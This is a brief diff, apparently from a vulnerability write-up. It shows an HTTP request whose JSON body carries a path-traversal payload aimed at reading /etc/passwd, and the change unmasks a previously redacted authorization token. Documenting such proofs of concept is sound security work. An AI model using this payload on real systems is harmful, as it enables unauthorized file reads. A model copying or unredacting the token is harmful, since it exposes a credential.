@@ -88,7 +88,7 @@ Accept-Language: en
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
 Content-Type: application/json; charset=UTF-8
 Origin: http://10.0.12.15
-authorization: P*****************************************A
+authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
 
 {"fileName":"../../../etc/passwd"}
 ```
